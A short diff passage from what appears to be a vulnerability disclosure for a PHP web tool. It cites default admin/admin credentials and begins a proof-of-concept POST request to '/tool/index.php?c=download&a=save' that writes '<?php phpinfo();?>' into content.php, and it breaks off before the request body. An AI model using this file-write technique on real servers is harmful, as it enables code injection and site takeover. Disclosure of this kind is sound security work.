@@ -21,6 +21,7 @@ Account/Password admin/admin
 <img width="1697" alt="image" src="https://github.com/user-attachments/assets/70ce8187-a1e4-49cb-93be-7b8a39773547">
 
 2. Through the following POC, write <?php phpinfo();?> into the content.php file.
+
 POC
 ```
 POST /tool/index.php?c=download&a=save HTTP/1.1
